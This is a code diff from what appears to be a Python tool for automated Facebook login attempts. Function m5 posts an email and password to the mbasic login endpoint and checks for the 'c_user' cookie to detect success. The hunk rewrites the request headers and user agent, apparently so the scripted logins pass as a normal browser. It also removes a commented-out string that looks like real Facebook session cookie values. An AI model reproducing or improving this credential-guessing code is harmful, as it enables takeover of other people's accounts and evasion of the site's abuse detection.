@@ -1151,29 +1151,15 @@ def m5(idf,pwv):
    "email":idf,
    "pass":ps,
    "login":"Log In"}
-   header_freefb = {
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-    "Accept-Encoding": "gzip, deflate, br, zstd",
-    "Accept-Language": "en-US,en;q=0.5",
-    "Alt-Used": "mbasic.alpha.facebook.com",
-    "Cache-Control": "no-cache",
+   header_freefb ={
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "Accept-Encoding": "gzip, deflate, sdch",
+    "Accept-Language": "en-US,en;q=0.8",
+    "Cache-Control": "max-age=0",
     "Connection": "keep-alive",
-    "Content-Length": "142",
-    "Content-Type": "application/x-www-form-urlencoded",
-    #"Cookie": "fr=0Ge9olQRX9wxG4dUG.AWVUPMO-gtG6VuvIObMUhqO6T4U.BmQamB..AAA.0.0.BmULGE.AWWCG6RmQFA; sb=galBZijJE3gDNJ8fh_fhANhG; datr=galBZo6ZvqtwWhtJgd_gsfBQ; ps_n=1; ps_l=1",
-    "DNT": "1",
     "Host": "m.facebook.com",
-    "Origin": "https://m.facebook.com",
-    "Pragma": "no-cache",
-    "Priority": "u=1",
-    "Referer": "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
-    "Sec-Fetch-Dest": "document",
-    "Sec-Fetch-Mode": "navigate",
-    "Sec-Fetch-Site": "same-origin",
-    "Sec-Fetch-User": "?1",
-    "TE": "trailers",
     "Upgrade-Insecure-Requests": "1",
-    "User-Agent": pro} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
+    "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"}#'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
    lo = session.post('https://mbasic.alpha.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
